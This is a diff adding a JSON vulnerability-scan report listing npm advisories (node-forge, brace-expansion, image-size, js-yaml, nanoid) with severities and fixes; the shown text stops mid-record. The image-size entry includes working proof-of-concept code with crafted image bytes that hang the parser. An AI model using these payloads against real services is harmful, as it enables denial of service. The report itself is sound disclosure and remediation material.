@@ -1,0 +1,893 @@
+{
+  "analyzedAt": "2025-12-17T20:07:21.694Z",
+  "source": "Rayquaza01__HistoryCleaner.osv.json",
+  "summary": {
+    "totalVulnerabilities": 10,
+    "uniqueVulnerabilities": 9,
+    "affectedPackages": 8,
+    "stalePackages": 10,
+    "stalePackagesOldFix": 4,
+    "severityBreakdown": {
+      "CRITICAL": 0,
+      "HIGH": 0,
+      "MEDIUM": 2,
+      "LOW": 8
+    },
+    "recentVulnerabilities": 5,
+    "hasFixAvailable": 10
+  },
+  "vulnerabilities": [
+    {
+      "id": "GHSA-554w-wpv2-vw27",
+      "severity": "MEDIUM",
+      "severityScore": 4,
+      "cvssScores": [
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-66031"
+      ],
+      "summary": "node-forge has ASN.1 Unbounded Recursion",
+      "details": "### Summary\n\nAn Uncontrolled Recursion (CWE-674) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft deep ASN.1 structures that trigger unbounded recursive parsing. This leads to a Denial-of-Service (DoS) via stack exhaustion when parsing untrusted DER inputs.\n\n### Details\n\nAn ASN.1 Denial of Service (Dos) vulnerability exists in the node-forge `asn1.fromDer` function within `forge/lib/asn1.js`. The ASN.1 DER parser implementation (`_fromDer`) recurses for every constructed ASN.1 value (SEQUENCE, SET, etc.) and lacks a guard limiting recursion depth. An attacker can craft a small DER blob containing a very large nesting depth of constructed TLVs which causes the Node.js V8 engine to exhaust its call stack and throw `RangeError: Maximum call stack size exceeded`, crashing or incapacitating the process handling the parse. This is a remote, low-cost Denial-of-Service against applications that parse untrusted ASN.1 objects.\n\n### Impact\n\nThis vulnerability enables an unauthenticated attacker to reliably crash a server or client using node-forge for TLS connections or certificate parsing.\n\nThis vulnerability impacts the ans1.fromDer function in `node-forge` before patched version `1.3.2`. \n\nAny downstream application using this component is impacted. These components may be leveraged by downstream applications in ways that enable full compromise of availability.",
+      "cwes": [
+        {
+          "id": "CWE-674",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Very Recent (< 1 month)",
+        "isRecent": true,
+        "publishedDate": "2025-11-26T22:08:37Z",
+        "modifiedDate": "2025-11-26T22:42:00.208887Z",
+        "daysSincePublished": 20
+      },
+      "affected": {
+        "package": "node-forge",
+        "version": "1.3.1",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "1.3.1",
+        "fixedIn": "1.3.2",
+        "recommendation": "Upgrade to 1.3.2 or later",
+        "fixAvailableSince": "2025-11-26T22:42:00.208Z",
+        "daysSinceFix": 20,
+        "monthsSinceFix": 0,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/digitalbazaar/forge/security/advisories/GHSA-554w-wpv2-vw27"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/digitalbazaar/forge/commit/260425c6167a38aae038697132483b5517b26451"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/digitalbazaar/forge"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-65ch-62r8-g69g",
+      "severity": "MEDIUM",
+      "severityScore": 4,
+      "cvssScores": [
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-66030"
+      ],
+      "summary": "node-forge is vulnerable to ASN.1 OID Integer Truncation",
+      "details": "### Summary\n\n**MITRE-Formatted CVE Description**\nAn Integer Overflow (CWE-190) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft ASN.1 structures containing OIDs with oversized arcs. These arcs may be decoded as smaller, trusted OIDs due to 32-bit bitwise truncation, enabling the bypass of downstream OID-based security decisions.\n\n### Description\n\nAn ASN.1 OID Integer Truncation vulnerability exists in the node-forge `asn1.derToOid` function within `forge/lib/asn1.js`. OID components are decoded using JavaScript's bitwise left-shift operator (`<<`), which forcibly casts values to 32-bit signed integers. Consequently, if an attacker provides a mathematically unique, very large OID arc integer exceeding $2^{31}-1$, the value silently overflows and wraps around rather than throwing an error. \n\n### Impact\n\nThis vulnerability allows a specially crafted ASN.1 object to spoof an OID, where a malicious certificate with a massive, invalid OID is misinterpreted by the library as a trusted, standard OID, potentially bypassing security controls.\n\nThis vulnerability impacts the `asn1.derToOid` function in `node-forge` before patched version `1.3.2`. \n\nAny downstream application using this component is impacted. This component may be leveraged by downstream applications in ways that enables partial compromise of integrity, leading to potential availability and confidentiality compromises.",
+      "cwes": [
+        {
+          "id": "CWE-190",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Very Recent (< 1 month)",
+        "isRecent": true,
+        "publishedDate": "2025-11-26T22:07:44Z",
+        "modifiedDate": "2025-12-01T16:20:43.190555Z",
+        "daysSincePublished": 20
+      },
+      "affected": {
+        "package": "node-forge",
+        "version": "1.3.1",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "1.3.1",
+        "fixedIn": "1.3.2",
+        "recommendation": "Upgrade to 1.3.2 or later",
+        "fixAvailableSince": "2025-12-01T16:20:43.190Z",
+        "daysSinceFix": 16,
+        "monthsSinceFix": 0,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/digitalbazaar/forge/security/advisories/GHSA-65ch-62r8-g69g"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66030"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/digitalbazaar/forge/commit/3e0c35ace169cfca529a3e547a7848dc7bf57fdb"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/digitalbazaar/forge"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-v6h2-p8h4-qcjw",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-5889"
+      ],
+      "summary": "brace-expansion Regular Expression Denial of Service vulnerability",
+      "details": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.",
+      "cwes": [
+        {
+          "id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption (DoS)"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-06-09T21:30:51Z",
+        "modifiedDate": "2025-06-11T20:54:10Z",
+        "daysSincePublished": 190
+      },
+      "affected": {
+        "package": "brace-expansion",
+        "version": "1.1.11",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "1.1.11",
+        "fixedIn": "2.0.2",
+        "recommendation": "Upgrade to 2.0.2 or later",
+        "fixAvailableSince": "2025-06-11T20:54:10.000Z",
+        "daysSinceFix": 188,
+        "monthsSinceFix": 6,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-5889"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217"
+        },
+        {
+          "type": "WEB",
+          "url": "https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/juliangruber/brace-expansion"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?ctiid.311660"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?id.311660"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?submit.585717"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-v6h2-p8h4-qcjw",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-5889"
+      ],
+      "summary": "brace-expansion Regular Expression Denial of Service vulnerability",
+      "details": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.",
+      "cwes": [
+        {
+          "id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption (DoS)"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-06-09T21:30:51Z",
+        "modifiedDate": "2025-06-11T20:54:10Z",
+        "daysSincePublished": 190
+      },
+      "affected": {
+        "package": "brace-expansion",
+        "version": "2.0.1",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "2.0.1",
+        "fixedIn": "2.0.2",
+        "recommendation": "Upgrade to 2.0.2 or later",
+        "fixAvailableSince": "2025-06-11T20:54:10.000Z",
+        "daysSinceFix": 188,
+        "monthsSinceFix": 6,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-5889"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217"
+        },
+        {
+          "type": "WEB",
+          "url": "https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/juliangruber/brace-expansion"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?ctiid.311660"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?id.311660"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?submit.585717"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-m5qc-5hw7-8vg7",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [],
+      "summary": "image-size Denial of Service via Infinite Loop during Image Processing",
+      "details": "### Summary\n\n`image-size` is vulnerable to a Denial of Service vulnerability when processing specially crafted images.\n\nThe issue occurs because of an infine loop in `findBox` when processing certain images with a box with size `0`.\n\n\n### Details\n\nIf the first bytes of the input does not match any bytes in `firstBytes`, then the package tries to validate the image using other handlers:\n```js\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/detector.ts#L20-L31\nexport function detector(input: Uint8Array): imageType | undefined {\n  const byte = input[0]\n  if (byte in firstBytes) {\n    const type = firstBytes[byte]\n    if (type && typeHandlers[type].validate(input)) {\n      return type\n    }\n  }\n\n  const finder = (key: imageType) => typeHandlers[key].validate(input) //<--\n  return keys.find(finder)\n}\n```\n\nSome handlers that call `findBox` to validate or calculate the image size are `jxl`, `heif` and `jp2`.\n\n`JXL` handler calls `findBox` inside `validate`. To reach the `findBox` call, the value at position `4:8` should be `'JXL '`\n```js\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jxl.ts#L51-L60\nexport const JXL: IImage = {\n  validate: (input: Uint8Array): boolean => {\n    const boxType = toUTF8String(input, 4, 8)\n    if (boxType !== 'JXL ') return false      //<---\n\n    const ftypBox = findBox(input, 'ftyp', 0) //<---\n    if (!ftypBox) return false\n\n    const brand = toUTF8String(input, ftypBox.offset + 8, ftypBox.offset + 12)\n    return brand === 'jxl '\n  },\n```\n\n`findBox` can lead to an infinite loop because the value of `box.size` is `0`, thus the `offset` variable is not updated. Below relevant code with comments (using one of the `PAYLOAD` below as example):\n```js\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L33-L37\nexport const readUInt32BE = (input: Uint8Array, offset = 0) =>\n  input[offset] * 2 ** 24 +     // 0 +\n  input[offset + 1] * 2 ** 16 + // 0 +\n  input[offset + 2] * 2 ** 8 +  // 0 +\n  input[offset + 3]             // 0\n\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L66-L75\nfunction readBox(input: Uint8Array, offset: number) {   // offset: 0\n  if (input.length - offset < 4) return\n  const boxSize = readUInt32BE(input, offset)           // 0\n  if (input.length - offset < boxSize) return           // (8 - 0) < 0 => false\n  return {\n    name: toUTF8String(input, 4 + offset, 8 + offset),  // 'JXL '\n    offset,                                             // 0\n    size: boxSize,                                      // 0\n  }\n}\n\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L77-L84\nexport function findBox(input: Uint8Array, boxName: string, offset: number) { // boxName: 'ftyp', offset: 0\n  while (offset < input.length) {         // 0 < 8 => false\n    const box = readBox(input, offset)    // { name: 'JXL ', offset: 0, size: 0 }\n    if (!box) break                       // false\n    if (box.name === boxName) return box  // 'JXL ' === 'ftyp' => false\n    offset += box.size                    // offset += 0\n  }\n}\n\n```\n\nA similar issue occurs for `HEIF` and `JP2` handlers:\n- https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts\n- https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts\n\n\n### PoC\n\nUsage:\n```bash\nnode main.js poc1|poc2\n```\n\n- poc for `image-size@2.0.1`\n```js\n// mkdir 2.0.1\n// cd 2.0.1/\n// npm i image-size@2.0.1\nconst {imageSizeFromFile} = require(\"image-size/fromFile\");\nconst {imageSize} = require(\"image-size\");\n\nconst fs = require('fs');\n\n// JXL\nconst PAYLOAD = new Uint8Array([\n  0x00, 0x00, 0x00, 0x00, // Box with size 0\n  0x4A, 0x58, 0x4C, 0x20, // \"JXL \"\n]);\n\n// HEIF\n// const PAYLOAD = new Uint8Array([\n//   0x00, 0x00, 0x00, 0x00, // Box with size 0\n//   0x66, 0x74, 0x79, 0x70, // \"ftyp\"\n//   0x61, 0x76, 0x69, 0x66  // \"avif\"\n// ]);\n\n// JP2\n// const PAYLOAD = new Uint8Array([\n//   0x00, 0x00, 0x00, 0x00, // Box with size 0\n//   0x6A, 0x50, 0x20, 0x20, // \"jP  \"\n// ]);\n\nconst FILENAME = \"./poc.svg\"\n\nfunction createPayload() {\n  fs.writeFileSync(FILENAME, PAYLOAD);\n}\n\nfunction poc1() { \n  (async () => {\n    await imageSizeFromFile(FILENAME)\n    console.log('Done') // never executed\n  })();\n}\n\nfunction poc2() {\n  imageSize(PAYLOAD)\n  console.log('Done') // never executed\n}\n\nconst pocs = new Map();\npocs.set('poc1', poc1); // node main.js poc1\npocs.set('poc2', poc2); // node main.js poc2\n\nasync function run() {\n  createPayload()\n  const args = process.argv.slice(2);\n  const t = args[0];\n  const poc = pocs.get(t) || poc1;\n  console.log(`Running poc....`)\n  await poc();\n}\n\nrun();\n```\n\n- poc for `image-size@1.2.0`\n```js\n// mkdir 1.2.0\n// cd 1.2.0/\n// npm i image-size@1.2.0\nconst sizeOf = require(\"image-size\");\nconst fs = require('fs');\n\n// JXL\nconst PAYLOAD = new Uint8Array([\n  0x00, 0x00, 0x00, 0x00, // Box with size 0\n  0x4A, 0x58, 0x4C, 0x20, // \"JXL \"\n]);\n\n// HEIF\n// const PAYLOAD = new Uint8Array([\n//   0x00, 0x00, 0x00, 0x00, // Box with size 0\n//   0x66, 0x74, 0x79, 0x70, // \"ftyp\"\n//   0x61, 0x76, 0x69, 0x66  // \"avif\"\n// ]);\n\n// JP2\n// const PAYLOAD = new Uint8Array([\n//   0x00, 0x00, 0x00, 0x00, // Box with size 0\n//   0x6A, 0x50, 0x20, 0x20, // \"jP  \"\n// ]);\n\nconst FILENAME = \"./poc.svg\"\n\nfunction createPayload() {\n  fs.writeFileSync(FILENAME, PAYLOAD);\n}\n\nfunction poc1() {\n  sizeOf(FILENAME)\n  console.log('Done') // never executed\n}\n\nfunction poc2() {\n  sizeOf(PAYLOAD)\n  console.log('Done') // never executed\n}\n\nconst pocs = new Map();\npocs.set('poc1', poc1); // node main.js poc1\npocs.set('poc2', poc2); // node main.js poc2\n\nasync function run() {\n  createPayload()\n  const args = process.argv.slice(2);\n  const t = args[0];\n  const poc = pocs.get(t) || poc1;\n  console.log(`Running poc....`)\n  await poc();\n}\n\nrun();\n```\n\n- poc for `image-size@1.1.1`\n```js\n// mkdir 1.1.1\n// cd 1.1.1/\n// npm i image-size@1.1.1\nconst sizeOf = require(\"image-size\");\nconst fs = require('fs');\n\n// HEIF\nconst PAYLOAD = new Uint8Array([\n  0x00, 0x00, 0x00, 0x00, // Box with size 0\n  0x66, 0x74, 0x79, 0x70, // \"ftyp\"\n  0x61, 0x76, 0x69, 0x66  // \"avif\"\n]);\n\nconst FILENAME = \"./poc.svg\"\n\nfunction createPayload() {\n  fs.writeFileSync(FILENAME, PAYLOAD);\n}\n\nfunction poc1() {\n  sizeOf(FILENAME)\n  console.log('Done') // never executed\n}\n\nfunction poc2() {\n  sizeOf(PAYLOAD)\n  console.log('Done') // never executed\n}\n\nconst pocs = new Map();\npocs.set('poc1', poc1); // node main.js poc1\npocs.set('poc2', poc2); // node main.js poc2\n\nasync function run() {\n  createPayload()\n  const args = process.argv.slice(2);\n  const t = args[0];\n  const poc = pocs.get(t) || poc1;\n  console.log(`Running poc....`)\n  await poc();\n}\n\nrun();\n```\n\n\n### Impact\n\nDenial of Service",
+      "cwes": [
+        {
+          "id": "CWE-770",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-04-02T15:04:58Z",
+        "modifiedDate": "2025-05-28T15:04:08Z",
+        "daysSincePublished": 259
+      },
+      "affected": {
+        "package": "image-size",
+        "version": "1.1.1",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "1.1.1",
+        "fixedIn": "1.2.1",
+        "recommendation": "Upgrade to 1.2.1 or later",
+        "fixAvailableSince": "2025-05-28T15:04:08.000Z",
+        "daysSinceFix": 203,
+        "monthsSinceFix": 6,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/image-size/image-size"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-mh29-5h37-fv8m",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-64718"
+      ],
+      "summary": "js-yaml has prototype pollution in merge (<<)",
+      "details": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+      "cwes": [
+        {
+          "id": "CWE-1321",
+          "name": "Improperly Controlled Modification of Object Prototype Attributes (Prototype Pollution)"
+        }
+      ],
+      "age": {
+        "age": "Recent (< 6 months)",
+        "isRecent": true,
+        "publishedDate": "2025-11-14T14:29:48Z",
+        "modifiedDate": "2025-11-17T15:20:43Z",
+        "daysSincePublished": 33
+      },
+      "affected": {
+        "package": "js-yaml",
+        "version": "4.1.0",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.1.0",
+        "fixedIn": "4.1.1",
+        "recommendation": "Upgrade to 4.1.1 or later",
+        "fixAvailableSince": "2025-11-17T15:20:43.000Z",
+        "daysSinceFix": 30,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64718"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodeca/js-yaml"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-mwcw-c2x4-8c55",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-55565"
+      ],
+      "summary": "Predictable results in nanoid generation when given non-integer values",
+      "details": "When nanoid is called with a fractional value, there were a number of undesirable effects:\n\n1. in browser and non-secure, the code infinite loops on while (size--)\n2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled\n3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error\n\nVersion 3.3.8 and 5.0.9 are fixed.",
+      "cwes": [
+        {
+          "id": "CWE-835",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-12-09T03:30:59Z",
+        "modifiedDate": "2025-11-04T16:54:54Z",
+        "daysSincePublished": 373
+      },
+      "affected": {
+        "package": "nanoid",
+        "version": "3.3.7",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "3.3.7",
+        "fixedIn": "5.0.9",
+        "recommendation": "Upgrade to 5.0.9 or later",
+        "fixAvailableSince": "2025-11-04T16:54:54.000Z",
+        "daysSinceFix": 43,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-55565"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ai/nanoid/pull/510"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/ai/nanoid"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ai/nanoid/compare/3.3.7...3.3.8"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ai/nanoid/releases/tag/5.0.9"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2024/12/msg00025.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2025/01/msg00006.html"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-5gfm-wpxj-wjgq",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-12816"
+      ],
+      "summary": "node-forge has an Interpretation Conflict vulnerability via its ASN.1 Validator Desynchronization",
+      "details": "### Summary\n\nCVE-2025-12816 has been reserved by CERT/CC\n\n**Description**\nAn Interpretation Conflict (CWE-436) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft ASN.1 structures to desynchronize schema validations, yielding a semantic divergence that may bypass downstream cryptographic verifications and security decisions.\n\n\n### Details\n\nA critical ASN.1 validation bypass vulnerability exists in the node-forge asn1.validate function within `forge/lib/asn1.js`. ASN.1 is a schema language that defines data structures, like the typed record schemas used in X.509, PKCS#7, PKCS#12, etc. DER (Distinguished Encoding Rules), a strict binary encoding of ASN.1, is what cryptographic code expects when verifying signatures, and the exact bytes and structure must match the schema used to compute and verify the signature. After deserializing DER, Forge uses static ASN.1 validation schemas to locate the signed data or public key, compute digests over the exact bytes required, and feed digest and signature fields into cryptographic primitives.\n\nThis vulnerability allows a specially crafted ASN.1 object to desynchronize the validator on optional boundaries, causing a malformed optional field to be semantically reinterpreted as the subsequent mandatory structure. This manifests as logic bypasses in cryptographic algorithms and protocols with optional security features (such as PKCS#12, where MACs are treated as absent) and semantic interpretation conflicts in strict protocols (such as X.509, where fields are read as the wrong type).\n\n### Impact\n\nThis flaw allows an attacker to desynchronize the validator, allowing critical components like digital signatures or integrity checks to be skipped or validated against attacker-controlled data.\n\nThis vulnerability impacts the `ans1.validate` function in `node-forge` before patched version `1.3.2`.\nhttps://github.com/digitalbazaar/forge/blob/main/lib/asn1.js.\n\nThe following components in `node-forge` are impacted.\n[lib/asn1.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/asn1.js#L1153)\n[lib/x509.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/x509.js#L667)\n[lib/pkcs12.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs12.js#L328)\n[lib/pkcs7.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs7.js#L90)\n[lib/rsa.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/rsa.js#L1167)\n[lib/pbe.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pbe.js#L363)\n[lib/ed25519.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/ed25519.js#L81)\n\nAny downstream application using these components is impacted.\n\nThese components may be leveraged by downstream applications in ways that enable full compromise of integrity, leading to potential availability and confidentiality compromises.",
+      "cwes": [
+        {
+          "id": "CWE-436",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Very Recent (< 1 month)",
+        "isRecent": true,
+        "publishedDate": "2025-11-26T22:07:19Z",
+        "modifiedDate": "2025-11-26T22:27:49.675787Z",
+        "daysSincePublished": 20
+      },
+      "affected": {
+        "package": "node-forge",
+        "version": "1.3.1",
+        "ecosystem": "npm"
+      },
+      "fix": {
